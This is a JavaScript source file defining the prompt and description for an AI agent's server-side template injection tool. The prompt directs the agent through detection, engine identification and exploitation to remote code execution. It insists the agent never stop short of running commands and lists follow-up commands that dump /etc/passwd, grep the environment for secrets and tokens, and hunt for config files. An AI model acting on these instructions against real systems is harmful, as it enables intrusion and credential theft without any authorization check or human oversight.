import { SSTI_TOOL_NAME } from './constants.js'

export const DESCRIPTION = `Server-Side Template Injection (SSTI) detection, engine identification, and RCE exploitation.`

export const PROMPT = `## ${SSTI_TOOL_NAME} — Server-Side Template Injection → RCE

Detects SSTI vulnerabilities, identifies the template engine, and executes OS commands.

### ESCALATION RULE — Always run all three steps in sequence:
1. action=detect — confirm math payload evaluates (${'$'}{7*7}=49, {{7*7}}=49, <%=7*7%>=49)
2. action=identify — narrow the exact engine (required before exploit)
3. action=exploit — execute OS commands immediately (id, whoami, cat /etc/passwd)
Do NOT stop after detect or identify. SSTI is only useful if you reach command execution.

### Actions
- \`detect\` — test math payloads to confirm template injection
- \`identify\` — narrow down the exact engine (Jinja2 vs Twig, etc.)
- \`exploit\` — attempt RCE payloads for the detected engine

### Supported engines
jinja2, twig, freemarker, velocity, mako, smarty, erb, pebble, spring

### After successful RCE — run these commands:
- \`id\` — confirm execution context
- \`cat /etc/passwd\` — enumerate users
- \`env | grep -i "key\\|secret\\|pass\\|token\\|api\\|db"\` — find credentials in environment
- \`find /var/www /opt /home -name "*.env" -o -name "config.php" -o -name "application.yml" 2>/dev/null | head -20\` — find config files
- \`cat /proc/version\` — kernel version for local priv-esc

### Input
- \`url\`: target URL (required)
- \`parameter\`: query/body parameter to inject (omit to try common ones)
- \`method\`: GET or POST (default: GET)
- \`data\`: POST body with INJECT placeholder (for POST)
- \`engine\`: hint the engine or use auto (default: auto)
- \`action\`: detect | identify | exploit
- \`timeout_secs\`: per-request timeout (default: 60)

### Examples
- Detect: \`{ url: "https://target/search?q=hello", parameter: "q", action: "detect" }\`
- Identify: \`{ url: "https://target/search?q=hello", parameter: "q", action: "identify" }\`
- Exploit: \`{ url: "https://target/search?q=hello", parameter: "q", engine: "jinja2", action: "exploit" }\`
- POST: \`{ url: "https://target/render", method: "POST", data: "template=INJECT", action: "detect" }\`
`
